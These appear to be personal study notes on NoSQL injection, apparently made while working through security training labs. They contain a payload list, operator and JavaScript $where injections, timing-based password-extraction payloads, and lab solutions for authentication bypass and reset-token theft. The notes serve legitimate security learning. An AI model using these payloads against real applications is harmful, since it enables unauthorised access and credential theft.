

its a vulnerability where an attacker is able to interfere with the queries that an app generated to nosql DB 



NoSql injection enables:
- bypass auth or protection mechanisms
- extract or edit data
- cause a denial of service
- execute code on the server 


there are 2 types of injection : 
- `syntax`:  break thje nosql query , enabling you to inject your worn payload. 
- `operator`: occurs when you can use NoSQL  query operators to manipulate queries 


# Detect 
break the query syntax.

- [ ] fuzz`
- [ ] ``'"`{``
- [ ] `;$Foo}`
- [ ] `$Foo \xYZ`
- [ ] special char  


# Entry Point

```
	',
	'',
	;%00,
	--,
	-- -,
	\"\",
	;,
	' OR '1,
	' OR 1 -- -,
	\" OR \"\" = \",
	\" OR 1 = 1 -- -,
	' OR '' = ',
	OR 1=1,
	$gt,
	{\"$gt\":\"\"},
	{\"$gt\":-1},
	$ne,
	{\"$ne\":\"\"},
	{\"$ne\":-1},
	$nin,
	{\"$nin\":1},
	{\"$nin\":[1]},
	|| '1'=='1,
	//,
	||'a'\\'a,
	'||'1'=='1';//,
	'/{}:,
	'\"\\;{},
	'\"\/$[].>,
	{\"$where\": \"sleep(1000)\"}
	`{"$ne":"invalid"}`
```

executing this query ``https://insecure-website.com/product/lookup?category=fizzy``
result in the db ``this.category == 'fizzy'``



# Determine

inject ' individual char  if this causes a change from the original response this may indicate that the ' has broken the query syntax and caused an error  to confirm  add  \'  if this doesnt cause an error that means that is is vuln  since the app doest sanitize the input 


# Confirm

determine whether you can influence boolean conditions using nosql.
 2 request 1 false and 1 true   url encoded 
- [ ] `' && 0 && 'x`
- [ ] `' && 1 && 'x`


we can overwrite existing conditions by injecting somehting like this `'fizzy'||'1'=='1'`



adding null char after the category value  may ignore all chars after a null  means any additional conditional queries are ignored 

# Operator injection

- $where matches docuements that satisfy a JS expression
- $ne matches all values that are != value
- $in matches all the values in an array
- $regex 
```nosql
`{"username":"wiener"}`
```

```nosql
`{"username":{"$ne":"invalid"}}`

```

```
"$where":"0" or JSCODE
```


```
`{"username":"admin","password":{"$regex":"^.*"}}`
```

Timing based

```
`{"$where": "sleep(5000)"}`
```

The following timing based payloads will trigger a time delay if the password beings with the letter `a`:

`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`

`admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`

if it doesnt work otice that one of the JSON parameters is for a password reset token.
1) convert the request GET to POST
2) content-type to app/json
3) add json message body
4) inject query operators in JSON


```nosql
`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
```


we can also inject where clause like this 
``{"username":"wiener","password":"peter", "$where":"1"}``

or basically $match
# Lab: Detecting NoSQL injection

`GET /filter?category=Clothing%2c+shoes+and+accessories'||'1' == '1




# Lab: Exploiting NoSQL operator injection to bypass authentication

```nosql
{"username":
{"$in":["adminnvmx3tsy"]},"password":{"$ne":""}}
```



# Lab: Exploiting NoSQL injection to extract data


```nosql
`admin' && this.password[0] == 'a' || 'a'=='b`
```


```http
GET /user/lookup?user=administrator'+%26%26+this.password[§0§]+%3d%3d+'§a§'+||+'a'%3d%3d'b
```


intruder cluster bomb 


# Lab: Exploiting NoSQL operator injection to extract unknown fields



start with  `login` there is `username` and `password`

check the entry point list we notice there is a difference in the response

add where 0 and 1 we can see that when it is responding with 1  meaning true 0 false for carlos credential

use this to check the keys
```
"$where":"function(){if(Object.keys(this)[4].match(/^.{§0§}§a§.*/)) return 1; return 0;}"
```

we notice that there is a  field of newPwdTkn 
go to get forget Password and add this field ?newPwdTkn=0412818a5712f41e 
```
{"username":"carlos","password":{
"$ne": "Invalid"
},
"$where":"function(){if(this.newPwdTkn.match(/^.{§a§}§a§.*/)) return 1; return 0;}"

}
```